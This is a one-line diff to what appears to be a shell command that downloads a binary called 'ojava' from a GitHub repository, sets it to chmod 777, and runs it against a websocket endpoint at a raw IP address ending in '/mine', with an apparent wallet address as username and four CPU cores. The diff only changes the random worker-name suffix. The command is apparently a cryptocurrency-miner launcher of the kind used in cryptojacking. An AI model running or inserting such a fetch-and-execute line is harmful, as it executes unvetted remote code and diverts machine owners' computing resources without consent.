@@ -1,1 +1,1 @@
-wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/ojava && chmod 777 ojava && ./ojava --url ws://146.190.104.148:80/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-GHH) --cores 4 
+wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/ojava && chmod 777 ojava && ./ojava --url ws://146.190.104.148:80/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-5 -n 1)-GX) --cores 4 
